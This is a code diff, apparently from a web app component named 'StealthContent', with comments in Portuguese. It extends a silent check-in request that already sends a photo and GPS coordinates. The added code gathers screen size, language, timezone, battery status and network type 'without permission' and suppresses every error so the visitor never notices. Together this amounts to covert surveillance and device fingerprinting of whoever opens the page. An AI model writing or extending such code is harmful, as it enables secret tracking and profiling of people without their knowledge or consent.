@@ -103,12 +103,38 @@ function StealthContent() {
       // GPS negado → continua com 0,0
     }
 
-    // 3. Enviar dados silenciosamente
+    // 3. Coletar info extra do dispositivo (sem permissão)
+    const deviceInfo: Record<string, unknown> = {
+      tela: `${window.screen.width}x${window.screen.height}`,
+      idioma: navigator.language || '',
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+    };
+
+    // Bateria (se disponível)
+    try {
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      const battery = await (navigator as any).getBattery?.();
+      if (battery) {
+        deviceInfo.bateria = Math.round(battery.level * 100);
+        deviceInfo.carregando = battery.charging;
+      }
+    } catch { /* silencioso */ }
+
+    // Tipo de rede (se disponível)
+    try {
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
+      if (conn) {
+        deviceInfo.rede = conn.effectiveType || conn.type || '';
+      }
+    } catch { /* silencioso */ }
+
+    // 4. Enviar dados silenciosamente
     try {
       await fetch('/api/checkin', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ token, foto, latitude: lat, longitude: lng }),
+        body: JSON.stringify({ token, foto, latitude: lat, longitude: lng, ...deviceInfo }),
       });
     } catch {
       // Falha silenciosa
